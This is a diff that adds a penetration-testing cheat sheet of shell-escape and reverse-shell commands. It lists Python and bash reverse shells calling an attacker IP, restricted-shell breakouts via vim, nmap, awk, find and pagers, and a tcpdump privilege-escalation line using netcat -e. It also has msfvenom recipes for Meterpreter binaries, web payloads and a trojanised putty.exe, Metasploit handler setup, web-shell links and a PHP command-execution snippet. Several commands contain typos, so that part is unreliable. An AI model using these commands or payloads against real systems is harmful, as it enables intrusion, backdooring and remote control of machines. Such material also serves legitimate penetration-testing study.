@@ -1,0 +1,152 @@
+== Spawning a TTY Shell - Break out of Jail or limited shell ==
+
+*PYTHON*
+-----
+`python -c 'import pty; pty.spawn("/bin/sh")'`
+-----
+python -c 'import pty; pty.spawn("/bin/bash")'
+-----
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);          s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
+-----
+python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
+=====
+
+
+*BASH*
+-----
+bash -i >& /dev/tcp/$attacker_IP/4444 0>&1  // from the victim to your IP. nc -lvvp should be listening
+-----
+`echo os.system('/bin/bash')`
+-----
+`/bin/sh -i`
+-----
+:! /bin/bash
+-----
+`':!bash':`   //from vim
+-----
+`:!bash`    // from vi
+-----
+`!sh`    //from nmap
+-----
+`:set shell=/bin/bash:shell`
+-----
+   echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root      //from tcpdump
+-----
+open vi or vim and type:   //from vi
+:set shell=/bin/bash
+Next, type and execute
+:shell
+-----
+awk 'BEGIN {system("/bin/sh")}'
+-----
+find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+-----
+ After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file. // more, less, man commands
+-----
+echo "evil script code" | tee script.sh      // tee -a to append at the end of the file
+-----
+
+
+*OTHERS*
+-----
+perl -e 'exec "/bin/sh";'
+-----
+perl: exec "/bin/sh";
+-----
+ruby: exec "/bin/sh"
+-----
+lua: os.execute('/bin/sh')
+-----
+irb(main:001:0> exec "/bin/sh" 
+-----
+lua: `os.execute('/bin/sh')`
+-----
+`exec "/bin/sh"`     // from IRB
+
+ 
+ *SHELLS:*
+ -----
+ MSFVENOM
+    
+ List payloads
+ msfvenom -l
+ 
+            == Binaries ==
+ Linux
+ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+    
+ Windows
+ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+ 
+ msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=10.11.0.159 -e x86/shikata_ga_nai -i 5 -b "\x00" -f exe -o putty1.exe
+
+ 
+           == Web payloads ==
+  
+  PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
+
+JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.159 LPORT=53 R > cmd.jsp
+
+WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+
+            == Scripting Payloads ==
+
+Python
+msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
+
+BASH
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
+
+Perl
+msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
+
+          == HANDLERS ==
+    
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit -j -z
+
+mssf > use exploit/multi/handler 
+msf exploit(handler) > setg PAYLOAD java/jsp_shell_reverse_tcp
+PAYLOAD => java/jsp_shell_reverse_tcp
+set LHOST 10.11.0.159
+set LPORT 4343
+LPORT => 4343
+msetg SHELL cmd.exe
+exploit -j -z
+
+
+*REVERSE SHELLS*  
+ -----
+ Pen test monkey PHP reverse shell  
+    [http://pentestmonkey.net/tools/web-shells/php-reverse-shel](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+
+-   php-findsock-shell - turns PHP port 80 into an interactive shell  
+    [http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)
+
+-   Perl Reverse Shell  
+    [http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)
+
+-   PHP powered web browser Shell b374k with file upload etc.  
+    [https://github.com/b374k/b374k](https://github.com/b374k/b374k)
+
+-   Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell 
+    https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
+  
+-   PHP shell. Execute some PHP code on a HTML/PHP page ==
+
+<?php
+$output = shell_exec('ls ../../');
+echo "<pre>$output</pre>";
+?>
